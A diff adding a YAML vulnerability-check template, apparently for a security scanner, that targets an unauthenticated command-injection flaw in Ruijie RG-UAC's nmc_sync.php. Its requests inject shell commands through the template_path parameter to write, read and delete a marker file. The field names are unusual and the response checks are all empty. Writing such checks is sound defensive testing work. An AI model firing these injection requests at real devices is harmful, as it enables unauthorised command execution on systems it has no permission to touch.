@@ -1,0 +1,25 @@
+id: ruijie-nmc-sync-rce
+brief:
+    title: Ruijie RG-UAC nmc_sync.php - Remote Code Execution
+    by: DhiyaneshDk
+    level: critical
+    about: There is a command execution vulnerability in the nmc_sync.php interface of Ruijie's RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary co...
+    label:
+        - rg-uac
+        - file-upload
+        - intrusive
+        - ruijie
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|echo+{{match_str}}+>+{{random_str}}.txt|cat'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/view/systemConfig/management/{{random_str}}.txt'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|rm+{{random_str}}.txt|cat'
+      signs: []
